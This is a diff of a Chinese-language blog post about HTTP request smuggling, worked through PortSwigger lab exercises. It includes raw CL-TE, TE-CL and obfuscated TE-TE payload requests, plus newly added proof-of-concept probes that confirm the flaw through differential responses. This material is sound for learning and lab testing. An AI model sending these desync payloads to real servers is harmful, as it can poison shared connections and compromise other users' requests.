@@ -33,7 +33,7 @@
 <meta property="og:description" content="前后端服务器对于HTTP请求处理的差异造成的HTTP走私">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-03-19T11:59:31.000Z">
-<meta property="article:modified_time" content="2021-03-21T07:44:53.683Z">
+<meta property="article:modified_time" content="2021-03-21T08:51:37.512Z">
 <meta property="article:author" content="xXxYOLOxXx">
 <meta property="article:tag" content="HTTP">
 <meta name="twitter:card" content="summary">
@@ -209,7 +209,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-21 15:44:53" itemprop="dateModified" datetime="2021-03-21T15:44:53+08:00">2021-03-21</time>
+                <time title="Modified: 2021-03-21 16:51:37" itemprop="dateModified" datetime="2021-03-21T16:51:37+08:00">2021-03-21</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -234,10 +234,13 @@
       
         <p>前后端服务器对于HTTP请求处理的差异造成的HTTP走私</p>
 <a id="more"></a>
-<h1 id="http走私"><a class="markdownIt-Anchor" href="#http走私"></a> HTTP走私</h1>
+<h1 id="basic-http-smuggling"><a class="markdownIt-Anchor" href="#basic-http-smuggling"></a> Basic HTTP Smuggling</h1>
 <h2 id="cl-te"><a class="markdownIt-Anchor" href="#cl-te"></a> CL-TE</h2>
-<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a><br />
-前端服务器优先处理Content-Length，后端服务器优先处理Transfer-Encoding</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p>
+<ul>
+<li>前端服务器优先处理Content-Length</li>
+<li>后端服务器优先处理Transfer-Encoding</li>
+</ul>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>lab_id.web-security-academy.net</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure>
 <ul>
 <li>前端服务器优先处理<code>Content-Length: 6</code>，内容为&quot;0\r\n\r\nG&quot;</li>
@@ -247,8 +250,11 @@
 如果将这个数据包重新发一次，就能得到<code>GPOST / HTTP/1.1</code></p>
 <hr />
 <h2 id="te-cl"><a class="markdownIt-Anchor" href="#te-cl"></a> TE-CL</h2>
-<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a><br />
-前端服务器优先处理Content-Length，后端服务器优先处理Transfer-Encoding</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p>
+<ul>
+<li>前端服务器优先处理Content-Length</li>
+<li>后端服务器优先处理Transfer-Encoding</li>
+</ul>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>lab_id.web-security-academy.net</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">97</span><br><span class="line"><span class="keyword">GPOST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>lab_id.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <ul>
 <li>前端服务器优先处理<code>Transfer-Encoding: chunked</code>，认为收到了两个数据块，第一个数据块大小为<code>0x97</code>，第二个数据块大小为<code>0x00</code>（即标识后续无数据）</li>
@@ -257,8 +263,11 @@
 <p>而第二个请求在解析时，请求方式为<code>GPOST</code>，即完成了HTTP Smuggling</p>
 <hr />
 <h2 id="te-te"><a class="markdownIt-Anchor" href="#te-te"></a> TE-TE</h2>
-<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header">https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header</a><br />
-前端服务器优先处理一个Transfer-Encoding，后端服务器优先处理另一个Transfer-Encoding</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header">https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header</a></p>
+<ul>
+<li>前端服务器优先处理一个Transfer-Encoding</li>
+<li>后端服务器优先处理另一个Transfer-Encoding</li>
+</ul>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>lab_id.web-security-academy.net</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>xXxYOLOxXx</span><br><span class="line"></span><br><span class="line">97</span><br><span class="line"><span class="keyword">GPOST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>lab_id.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <ul>
 <li>前端服务器优先处理第一个TE，<code>Transfer-Encoding: chunked</code>，认为收到了两个数据块，第一个数据块大小为<code>0x97</code>，第二个数据块大小为<code>0x00</code>（即标识后续无数据）</li>
@@ -267,6 +276,14 @@
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>lab_id.web-security-academy.net</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>xXxYOLOxXx</span><br><span class="line"></span><br><span class="line">97</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GPOST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>lab_id.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>则第二个请求在被解析时，请求方式为<code>GPOST</code>，即完成了HTTP Smuggling</p>
+<h1 id="poc-for-http-smuggling"><a class="markdownIt-Anchor" href="#poc-for-http-smuggling"></a> POC For HTTP Smuggling</h1>
+<p>响应404即可验证HTTP走私漏洞存在</p>
+<h2 id="cl-te-2"><a class="markdownIt-Anchor" href="#cl-te-2"></a> CL-TE</h2>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses">https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses</a></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>lab_id.web-security-academy.net</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/404</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Foo</span><span class="punctuation">: </span></span><br></pre></td></tr></table></figure>
+<h2 id="te-cl-2"><a class="markdownIt-Anchor" href="#te-cl-2"></a> TE-CL</h2>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses">https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses</a></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>lab_id.web-security-academy.net</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">14</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/404</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>参考链接:</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/lblblblblzdx/article/details/80386693">https://blog.csdn.net/lblblblblzdx/article/details/80386693</a></li>
@@ -369,7 +386,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#http%E8%B5%B0%E7%A7%81"><span class="nav-number">1.</span> <span class="nav-text"> HTTP走私</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cl-te"><span class="nav-number">1.1.</span> <span class="nav-text"> CL-TE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#te-cl"><span class="nav-number">1.2.</span> <span class="nav-text"> TE-CL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#te-te"><span class="nav-number">1.3.</span> <span class="nav-text"> TE-TE</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#basic-http-smuggling"><span class="nav-number">1.</span> <span class="nav-text"> Basic HTTP Smuggling</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cl-te"><span class="nav-number">1.1.</span> <span class="nav-text"> CL-TE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#te-cl"><span class="nav-number">1.2.</span> <span class="nav-text"> TE-CL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#te-te"><span class="nav-number">1.3.</span> <span class="nav-text"> TE-TE</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#poc-for-http-smuggling"><span class="nav-number">2.</span> <span class="nav-text"> POC For HTTP Smuggling</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cl-te-2"><span class="nav-number">2.1.</span> <span class="nav-text"> CL-TE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#te-cl-2"><span class="nav-number">2.2.</span> <span class="nav-text"> TE-CL</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -404,6 +421,15 @@
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
         <a href="https://github.com/monster414" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monster414" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yolo-yolo@qq.com" title="E-Mail → mailto:yolo-yolo@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://music.163.com/#/user/home?id=302397927" title="CloudMisuc → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;302397927" rel="noopener" target="_blank"><i class=" fa-fw"></i>CloudMisuc</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://steamcommunity.com/id/XXXXXXc/" title="Steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;id&#x2F;XXXXXXc&#x2F;" rel="noopener" target="_blank"><i class=" fa-fw"></i>Steam</a>
       </span>
   </div>
   <div class="cc-license motion-element" itemprop="license">
